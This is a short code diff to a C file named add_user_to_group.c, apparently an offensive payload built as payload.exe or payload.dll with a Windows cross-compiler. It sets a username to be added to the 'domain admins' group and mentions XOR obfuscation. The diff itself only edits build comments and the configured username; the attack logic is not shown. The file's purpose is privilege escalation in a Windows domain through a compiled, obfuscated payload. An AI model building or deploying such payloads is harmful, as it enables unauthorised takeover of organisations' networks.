@@ -2,10 +2,15 @@
 #include <stdio.h>
 #include <string.h>
 
-// Note: Compile using x86_64-w64-mingw32-gcc -shared -o payload.dll add_user_to_group.c
+/*
+* COMPILATION INSTRUCTIONS
+* For EXE file: x86_64-w64-mingw32-gcc add_user_to_group.c -o payload.exe
+* For DLL file: x86_64-w64-mingw32-gcc -shared -o payload.dll add_user_to_group.c
+*/
+
 
 // === 🔧 EDIT THESE STRINGS ===
-char username[] = "netadm";
+char username[] = "poopman";
 char groupname[] = "domain admins";
 
 // XOR key for simple obfuscation
